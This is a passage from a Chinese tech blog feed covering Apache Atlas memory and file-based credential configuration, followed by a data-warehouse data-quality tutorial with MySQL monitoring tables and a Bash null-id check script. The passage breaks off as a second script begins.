-XX:+UseConcMarkSweepGC -XX:+CMSParallelRemarkEnabled -XX:+PrintTenuringDistribution -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=dumps/atlas_server.hprof -Xloggc:logs/gc-worker.log -verbose:gc -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=10 -XX:GCLogFileSize=1m -XX:+PrintGCDetails -XX:+PrintHeapAtGC -XX:+PrintGCTimeStamps"</span></span><br><span class="line"><span class="comment">#建议JDK1.7使用以下配置</span></span><br><span class="line"><span class="built_in">export</span> ATLAS_SERVER_HEAP=<span class="string">"-Xms15360m -Xmx15360m -XX:MaxNewSize=3072m -XX:PermSize=100M -XX:MaxPermSize=512m"</span></span><br><span class="line"><span class="comment">#建议JDK1.8使用以下配置</span></span><br><span class="line"><span class="built_in">export</span> ATLAS_SERVER_HEAP=<span class="string">"-Xms15360m -Xmx15360m -XX:MaxNewSize=5120m -XX:MetaspaceSize=100M -XX:MaxMetaspaceSize=512m"</span></span><br><span class="line"><span class="comment">#如果是Mac OS用户需要配置</span></span><br><span class="line"><span class="built_in">export</span> ATLAS_SERVER_OPTS=<span class="string">"-Djava.awt.headless=true -Djava.security.krb5.realm= -Djava.security.krb5.kdc="</span></span><br><span class="line"><span class="comment"># 参数说明： -XX:SoftRefLRUPolicyMSPerMB 此参数对管理具有许多并发用户的查询繁重工作负载的GC性能特别有用</span></span><br></pre></td></tr></table></figure><h2 id="3、配置用户名密码">3、配置用户名密码</h2><p>Atlas支持以下身份验证方法：File、Kerberos协议、LDAP协议，通过修改配置文件<code>atlas-application.properties</code>文件开启或关闭三种验证方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atlas.authentication.method.kerberos=<span class="literal">true</span>|<span class="literal">false</span></span><br><span class="line">atlas.authentication.method.ldap=<span class="literal">true</span>|<span class="literal">false</span></span><br><span class="line">atlas.authentication.method.file=<span class="literal">true</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>如果两个或多个身份证验证方法设置为true，如果较早的方法失败，则身份验证将回退到后一种方法。例如，如果Kerberos身份验证设置为true并且ldap身份验证也设置为true，那么，如果对于没有kerberos principal和keytab的请求，LDAP身份验证将作为后备方案。</p><p>本文<strong>主要讲解采用文件方式修改用户名和密码设置。其他</strong>方式可以参见官网配置即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开/opt/module/atlas/conf/users-credentials.properties文件</span></span><br><span class="line">vim users-credentials.properties</span><br><span class="line"><span class="comment">#username=group::sha256-password</span></span><br><span class="line"><span class="comment"># admin时用户名称，8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918是采用sha256加密的密码，默认密码为admin</span></span><br><span class="line">admin=ADMIN::8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918</span><br><span class="line">rangertagsync=RANGER_TAG_SYNC::e3f67240f5117d1753c940dae9eea772d36ed5fe9bd9c94a300e40413f1afb9d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例如：修改用户名称为atguigu，密码为atguigu</span></span><br><span class="line"><span class="comment"># 获取sha256加密的atguigu密码</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">"atguigu"</span>|sha256sum</span><br><span class="line"><span class="comment"># 获得2628be627712c3555d65e0e5f9101dbdd403626e6646b72fdf728a20c5261dc2</span></span><br><span class="line"><span class="comment"># 修改用户名和密码</span></span><br><span class="line">vim users-credentials.properties</span><br><span class="line"><span class="comment">#username=group::sha256-password</span></span><br><span class="line">atguigu=ADMIN::2628be627712c3555d65e0e5f9101dbdd403626e6646b72fdf728a20c5261dc2</span><br><span class="line">rangertagsync=RANGER_TAG_SYNC::e3f67240f5117d1753c940dae9eea772d36ed5fe9bd9c94a300e40413f1afb9d</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、Atlas概述&lt;/h1&gt;
&lt;h2 id=&quot;1、Atlas入门&quot;&gt;1、Atlas入门&lt;/h2&gt;
&lt;p&gt;Apache Atlas为组织提供开放式元数据管理和治理功能，用以构建其数据资产目录，对这些资产进行分类和管理，并为数据分析师和数据治理团队，提供围绕这些数据资产的协作功能。同时可以配合ranger对某个元数据进行权限管理&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>数仓数据质量管理脚本</title>
    <link href="https://blog.shawncoding.top/posts/9d3ea346.html"/>
    <id>https://blog.shawncoding.top/posts/9d3ea346.html</id>
    <published>2024-05-31T08:23:53.000Z</published>
    <updated>2024-05-31T08:27:26.157Z</updated>
    
    <content type="html"><![CDATA[<h1>一、数据质量管理概述</h1><h2 id="1、数据质量管理定义">1、数据质量管理定义</h2><p>数据质量管理（Data Quality Management），是指对<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE/5947370" target="_blank" rel="noopener" title="数据">数据</a>从计划、获取、存储、共享、维护、应用、消亡生命周期的每个阶段里可能引发的各类数据质量问题，进行识别、度量、监控、预警等一系列管理活动，并通过改善和提高组织的管理水平使得<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E8%B4%A8%E9%87%8F/5134536" target="_blank" rel="noopener" title="数据质量">数据质量</a>获得进一步提高。</p><p>数据质量管理是循环管理过程，其终极目标是通过可靠的数据提升数据在使用中的价值，并最终为企业赢得经济效益</p><a id="more"></a><h2 id="2、数据质量评价指标">2、数据质量评价指标</h2><p>数据质量管理的最终目标是改善，任何改善都是建立在评价的基础上。通常数据质量的评价标准包括以下内容</p><table><thead><tr><th><strong>评价标准</strong></th><th><strong>描述</strong></th><th><strong>监控项</strong></th></tr></thead><tbody><tr><td><strong>唯一性</strong></td><td>指主键保持唯一</td><td>字段唯一性检查</td></tr><tr><td><strong>完整性</strong></td><td>主要包括记录缺失和字段值缺失等方面</td><td>字段枚举值检查</td></tr><tr><td></td><td></td><td>字段记录数检查</td></tr><tr><td></td><td></td><td>字段空值检查</td></tr><tr><td><strong>精确度</strong></td><td>数据生成的正确性，数据在整个链路流转的正确性</td><td>波动阀值检查</td></tr><tr><td><strong>合法性</strong></td><td>主要包括格式、类型、域值的合法性</td><td>字段日期格式检查</td></tr><tr><td></td><td></td><td>字段长度检查</td></tr><tr><td></td><td></td><td>字段值域检查</td></tr><tr><td><strong>时效性</strong></td><td>主要包括数据处理的时效性</td><td>批处理是否按时完成</td></tr></tbody></table><h1>二、数据质量管理实操</h1><h2 id="1、需求分析">1、需求分析</h2><p>我们的数仓项目主要监控以下数据的指标(脚本可以参考，这里主要按照电商数仓来搭建的)：</p><ul><li>ODS层数据量，每日环比和每周同比变化不能超过一定范围</li><li>DIM层不能出现id空值，重复值；</li><li>DWD层不能出现id空值，重复值；</li></ul><table><thead><tr><th><strong>表</strong></th><th><strong>检查项目</strong></th><th><strong>依据</strong></th><th><strong>异常值下限</strong></th><th><strong>异常值上限</strong></th></tr></thead><tbody><tr><td><strong>ods_order_info</strong></td><td>同比增长</td><td>数据总量</td><td>-10%</td><td>10%</td></tr><tr><td></td><td>环比增长</td><td>数据总量</td><td>-10%</td><td>50%</td></tr><tr><td></td><td>值域检查</td><td>final_amount</td><td>0</td><td>100</td></tr><tr><td><strong>dwd_order_info</strong></td><td>空值检查</td><td>id</td><td>0</td><td>10</td></tr><tr><td></td><td>重复值检查</td><td>id</td><td>0</td><td>5</td></tr><tr><td><strong>dim_user_info</strong></td><td>空值检查</td><td>id</td><td>0</td><td>10</td></tr><tr><td></td><td>重复值检查</td><td>id</td><td>0</td><td>5</td></tr></tbody></table><h2 id="2、功能模块">2、功能模块</h2><p><img src="http://qnypic.shawncoding.top/blog/202404161647181.png" alt></p><h2 id="3、开发环境准备">3、开发环境准备</h2><h3 id="3-1-Python开发环境准备">3.1 Python开发环境准备</h3><p>IDEA中点击File，在下拉选择中点击Settings，点击“Plugins”，点击右上角的“Marketplace”，然后在搜索框中输入“python”，在搜索结果列表中找到Python插件，点击“Install”，安装插件</p><p>点击Idea中的“File”，在下列列表中点击“New”，在右侧弹出的列表中点击Project，在新建的工程中，点击“Python”，然后点击Next，首次创建Python项目，会提示无Python SDK，此处选择Yes，后续再添加SDK</p><p>添加Python SDK，为了保证测试和运行的Python环境一致，我们配置项目采用远程集群的Python环境执行本地代码，以下为具体配置步骤。第一步：点击“File”→Project Structure，增加Python SDK，然后点击“SSH Interpreter”，选择“Existing server configuration”，这样远程就可以连接了</p><h3 id="3-2-初始化MySQL环境">3.2 初始化MySQL环境</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建data_supervisor库</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> <span class="keyword">if</span> <span class="keyword">exists</span> data_supervisor;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> data_supervisor;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建空值指标表，null_id</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> data_supervisor.<span class="string">`null_id`</span></span><br><span class="line">(</span><br><span class="line">    <span class="string">`dt`</span>                 <span class="built_in">date</span>        <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'日期'</span>,</span><br><span class="line">    <span class="string">`tbl`</span>                <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'表名'</span>,</span><br><span class="line">    <span class="string">`col`</span>                <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'列名'</span>,</span><br><span class="line">    <span class="string">`value`</span>              <span class="built_in">int</span>         <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'空ID个数'</span>,</span><br><span class="line">    <span class="string">`value_min`</span>          <span class="built_in">int</span>         <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'下限'</span>,</span><br><span class="line">    <span class="string">`value_max`</span>          <span class="built_in">int</span>         <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'上限'</span>,</span><br><span class="line">    <span class="string">`notification_level`</span> <span class="built_in">int</span>         <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'警告级别'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`dt`</span>, <span class="string">`tbl`</span>, <span class="string">`col`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span></span><br><span class="line">  <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span> = utf8</span><br><span class="line">    <span class="keyword">comment</span> <span class="string">'空值指标表'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建重复值指标表，duplicate</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> data_supervisor.<span class="string">`duplicate`</span></span><br><span class="line">(</span><br><span class="line">    <span class="string">`dt`</span>                 <span class="built_in">date</span>        <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'日期'</span>,</span><br><span class="line">    <span class="string">`tbl`</span>                <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'表名'</span>,</span><br><span class="line">    <span class="string">`col`</span>                <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'列名'</span>,</span><br><span class="line">    <span class="string">`value`</span>              <span class="built_in">int</span>         <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'重复值个数'</span>,</span><br><span class="line">    <span class="string">`value_min`</span>          <span class="built_in">int</span>         <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'下限'</span>,</span><br><span class="line">    <span class="string">`value_max`</span>          <span class="built_in">int</span>         <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'上限'</span>,</span><br><span class="line">    <span class="string">`notification_level`</span> <span class="built_in">int</span>         <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'警告级别'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`dt`</span>, <span class="string">`tbl`</span>, <span class="string">`col`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span></span><br><span class="line">  <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span> = utf8</span><br><span class="line">    <span class="keyword">comment</span> <span class="string">'重复值指标表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建值域指标表，rng</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> data_supervisor.<span class="string">`rng`</span></span><br><span class="line">(</span><br><span class="line">    <span class="string">`dt`</span>                 <span class="built_in">date</span>        <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'日期'</span>,</span><br><span class="line">    <span class="string">`tbl`</span>                <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'表名'</span>,</span><br><span class="line">    <span class="string">`col`</span>                <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'列名'</span>,</span><br><span class="line">    <span class="string">`value`</span>              <span class="built_in">int</span>         <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'超出预定值域个数'</span>,</span><br><span class="line">    <span class="string">`range_min`</span>          <span class="built_in">int</span>         <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'值域下限'</span>,</span><br><span class="line">    <span class="string">`range_max`</span>          <span class="built_in">int</span>         <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'值域上限'</span>,</span><br><span class="line">    <span class="string">`value_min`</span>          <span class="built_in">int</span>         <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'下限'</span>,</span><br><span class="line">    <span class="string">`value_max`</span>          <span class="built_in">int</span>         <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'上限'</span>,</span><br><span class="line">    <span class="string">`notification_level`</span> <span class="built_in">int</span>         <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'警告级别'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`dt`</span>, <span class="string">`tbl`</span>, <span class="string">`col`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span></span><br><span class="line">  <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span> = utf8</span><br><span class="line">    <span class="keyword">comment</span> <span class="string">'值域指标表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建环比增长指标表，day_on_day</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> data_supervisor.<span class="string">`day_on_day`</span></span><br><span class="line">(</span><br><span class="line">    <span class="string">`dt`</span>                 <span class="built_in">date</span>        <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'日期'</span>,</span><br><span class="line">    <span class="string">`tbl`</span>                <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'表名'</span>,</span><br><span class="line">    <span class="string">`value`</span>              <span class="keyword">double</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'环比增长百分比'</span>,</span><br><span class="line">    <span class="string">`value_min`</span>          <span class="keyword">double</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'增长上限'</span>,</span><br><span class="line">    <span class="string">`value_max`</span>          <span class="keyword">double</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'增长上限'</span>,</span><br><span class="line">    <span class="string">`notification_level`</span> <span class="built_in">int</span>    <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'警告级别'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`dt`</span>, <span class="string">`tbl`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span></span><br><span class="line">  <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span> = utf8</span><br><span class="line">    <span class="keyword">comment</span> <span class="string">'环比增长指标表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建同比增长指标表，week_on_week</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> data_supervisor.<span class="string">`week_on_week`</span></span><br><span class="line">(</span><br><span class="line">    <span class="string">`dt`</span>                 <span class="built_in">date</span>        <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'日期'</span>,</span><br><span class="line">    <span class="string">`tbl`</span>                <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'表名'</span>,</span><br><span class="line">    <span class="string">`value`</span>              <span class="keyword">double</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'同比增长百分比'</span>,</span><br><span class="line">    <span class="string">`value_min`</span>          <span class="keyword">double</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'增长上限'</span>,</span><br><span class="line">    <span class="string">`value_max`</span>          <span class="keyword">double</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'增长上限'</span>,</span><br><span class="line">    <span class="string">`notification_level`</span> <span class="built_in">int</span>    <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'警告级别'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`dt`</span>, <span class="string">`tbl`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span></span><br><span class="line">  <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span> = utf8</span><br><span class="line">    <span class="keyword">comment</span> <span class="string">'同比增长指标表'</span>;</span><br></pre></td></tr></table></figure><h2 id="4、规则检测模块">4、规则检测模块</h2><h3 id="4-1-单一规则检测脚本编写">4.1 单一规则检测脚本编写</h3><p>检测规则脚本分为五类：分别是空id检查脚本、重复id检查脚本、值域检查脚本、数据量环比检查脚本和数据量同比检查脚本。下面分别给大家介绍一下五类检测脚本的具体编写。</p><p><strong>空id检查脚本</strong></p><p>在Idea中创建一个文件null_id.sh，在文件中编写如下内容： 实现的主要功能是：计算空值个数，并将结果和自己定义的阈值上下限，插入到MySQL表中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 检查id空值</span></span><br><span class="line"><span class="comment"># 解析参数</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">"t:d:c:s:x:l:"</span> arg; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">case</span> <span class="variable">$arg</span> <span class="keyword">in</span></span><br><span class="line">  <span class="comment"># 要处理的表名</span></span><br><span class="line">  t)</span><br><span class="line">    TABLE=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 日期</span></span><br><span class="line">  d)</span><br><span class="line">    DT=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 要计算空值的列名</span></span><br><span class="line">  c)</span><br><span class="line">    COL=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 空值指标下限</span></span><br><span class="line">  s)</span><br><span class="line">    MIN=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 空值指标上限</span></span><br><span class="line">  x)</span><br><span class="line">    MAX=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 告警级别</span></span><br><span class="line">  l)</span><br><span class="line">    LEVEL=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  ?)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"unkonw argument"</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">    ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果dt和level没有设置，那么默认值dt是昨天 告警级别是0</span></span><br><span class="line">[ <span class="string">"<span class="variable">$DT</span>"</span> ] || DT=$(date -d <span class="string">'-1 day'</span> +%F)</span><br><span class="line">[ <span class="string">"<span class="variable">$LEVEL</span>"</span> ] || LEVEL=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数仓DB名称</span></span><br><span class="line">HIVE_DB=gmall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询引擎</span></span><br><span class="line">HIVE_ENGINE=hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL相关配置</span></span><br><span class="line">mysql_user=<span class="string">"root"</span></span><br><span class="line">mysql_passwd=<span class="string">"000000"</span></span><br><span class="line">mysql_host=<span class="string">"hadoop102"</span></span><br><span class="line">mysql_DB=<span class="string">"data_supervisor"</span></span><br><span class="line">mysql_tbl=<span class="string">"null_id"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 认证为hive用户，如在非安全(Hadoop未启用Kerberos认证)环境中，则无需认证</span></span><br><span class="line">kinit -kt /etc/security/keytab/hive.keytab hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># 空值个数</span></span><br><span class="line">RESULT=$(<span class="variable">$HIVE_ENGINE</span> -e <span class="string">"set hive.cli.print.header=false;select count(1) from <span class="variable">$HIVE_DB</span>.<span class="variable">$TABLE</span> where dt='<span class="variable">$DT</span>' and <span class="variable">$COL</span> is null;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果插入MySQL</span></span><br><span class="line">mysql -h<span class="string">"<span class="variable">$mysql_host</span>"</span> -u<span class="string">"<span class="variable">$mysql_user</span>"</span> -p<span class="string">"<span class="variable">$mysql_passwd</span>"</span> \</span><br><span class="line">  -e<span class="string">"INSERT INTO <span class="variable">$mysql_DB</span>.<span class="variable">$mysql_tbl</span> VALUES('<span class="variable">$DT</span>', '<span class="variable">$TABLE</span>', '<span class="variable">$COL</span>', <span class="variable">$RESULT</span>, <span class="variable">$MIN</span>, <span class="variable">$MAX</span>, <span class="variable">$LEVEL</span>)</span></span><br><span class="line"><span class="string">ON DUPLICATE KEY UPDATE \`value\`=<span class="variable">$RESULT</span>, value_min=<span class="variable">$MIN</span>, value_max=<span class="variable">$MAX</span>, notification_level=<span class="variable">$LEVEL</span>;"</span></span><br></pre></td></tr></table></figure><p><strong>重复id检查脚本</strong></p><p><a href="http://xn--Ideaduplicate-e00udtob05x67t0lxgy9aj02a.sh" target="_blank" rel="noopener">在Idea中创建一个文件duplicate.sh</a>，在文件中编写如下内容：实现的主要功能是：计算重复值个数，并将结果和自己定义的阈值上下限，插入到MySQL表中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 监控某张表一列的重复值</span></span><br><span class="line"><span class="comment"># 参数解析</span></span><br><span class="line"><span class="keyword">while</span> <span 